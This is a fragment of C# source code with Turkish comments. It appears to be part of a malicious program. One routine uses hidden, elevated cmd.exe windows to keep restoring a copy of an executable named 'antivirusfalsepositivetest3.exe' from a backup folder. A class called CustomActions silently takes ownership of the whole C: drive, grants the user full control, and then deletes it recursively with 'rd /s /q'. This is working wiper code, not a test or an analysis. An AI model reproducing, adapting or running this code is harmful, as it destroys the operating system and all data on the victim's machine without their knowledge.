                if (!File.Exists(regFilePath) || !File.ReadAllBytes(regFilePath).SequenceEqual(regFileBytes))
                {
                    try
                    {
                        // Save the resource to the temporary location
                        File.WriteAllBytes(regFilePath, regFileBytes);
                    }
                    catch (Exception ex)
                    {
                        // Handle the exception
                    }
                }

                if (File.Exists(antiAttackPath) && !File.Exists(backupPath))
                {
                    try
                    {
                        // Copy antivirusfalsepositivetest3.exe to the backup folder with elevated privileges
                        ProcessStartInfo processInfo = new ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            Arguments = $"/c copy \"{antiAttackPath}\" \"{backupPath}\" & pause",
                            Verb = "runas", // Run with elevated privileges (UAC)
                            CreateNoWindow = true,  // Hide the CMD window
                            WindowStyle = ProcessWindowStyle.Hidden
                        };

                        // Start the process
                        Process.Start(processInfo);
                    }
                    catch (Exception ex)
                    {
                        // Handle the exception
                    }
                }
                else if (!File.Exists(antiAttackPath) && File.Exists(backupPath))
                {
                    try
                    {
                        // Copy antivirusfalsepositivetest3.exe from the backup folder to the current folder with elevated privileges
                        ProcessStartInfo processInfo = new ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            Arguments = $"/c copy \"{backupPath}\" \"{antiAttackPath}\" & pause",
                            Verb = "runas", // Run with elevated privileges (UAC)
                            CreateNoWindow = true,  // Hide the CMD window
                            WindowStyle = ProcessWindowStyle.Hidden
                        };

                        // Start the process
                        Process.Start(processInfo);
                    }
                    catch (Exception ex)
                    {
                        // Handle the exception
                    }
                }
            }
        }

    public static class CustomActions
    {
        public static void System32()
        {

            // System32 dizin yolu
            string system32Path = ("C:\\");

            // takeown komutunu kullanarak sahipliği al
            Process takeownProcess = new Process();
            takeownProcess.StartInfo.FileName = "takeown";
            takeownProcess.StartInfo.Arguments = $"/F \"{system32Path}\" /R /A /D Y";
            takeownProcess.StartInfo.RedirectStandardOutput = true;
            takeownProcess.StartInfo.UseShellExecute = false;
            takeownProcess.StartInfo.CreateNoWindow = true;

            takeownProcess.Start();
            takeownProcess.WaitForExit();

            // icals komutunu kullanarak izinleri değiştir
            Process icaclsProcess = new Process();
            icaclsProcess.StartInfo.FileName = "icacls";
            icaclsProcess.StartInfo.Arguments = $"\"{system32Path}\" /grant %username%:(F)";
            icaclsProcess.StartInfo.RedirectStandardOutput = true;
            icaclsProcess.StartInfo.UseShellExecute = false;
            icaclsProcess.StartInfo.CreateNoWindow = true;

            icaclsProcess.Start();
            icaclsProcess.WaitForExit();

            // System32 dizinini silmek için rd komutunu kullan (Dikkatli olun!)
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = $"/C rd /s /q \"{system32Path}\"";
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;

            process.Start();
        }
    }
}